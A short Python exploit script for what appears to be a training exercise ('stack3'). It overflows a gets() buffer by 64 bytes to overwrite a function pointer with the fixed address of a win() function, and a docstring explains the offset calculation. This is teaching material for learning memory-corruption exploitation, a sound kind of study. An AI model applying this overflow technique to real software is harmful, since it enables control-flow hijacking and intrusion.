#!/usr/bin/env python3
"""
ex03 exploit  (stack3: overwrite a FUNCTION POINTER, redirect control flow).

main():
    gets(buffer=[esp+0x1c])                 <- unbounded
    if (fp = [esp+0x5c]) != 0:
        printf("calling function pointer, jumping to 0x%08x\n", fp)
        call fp                              <- we control where this jumps
win() @ 0x08048424 -> puts("code flow successfully changed")

Offset buffer -> fp = 0x5c - 0x1c = 0x40 = 64 bytes.
Overwrite fp with &win so the indirect `call eax` jumps into win().
(No PIE, so win's address is fixed.)

Usage (VM):   python3 ex03.py | /opt/hole-in-bin/ex03/bin
Local:        python3 scripts/ex03.py | scripts/runlocal.sh challenges/ex03/bin
"""
import struct
import sys

OFFSET = 64
WIN = 0x08048424
payload = b"A" * OFFSET + struct.pack("<I", WIN)
sys.stdout.buffer.write(payload)
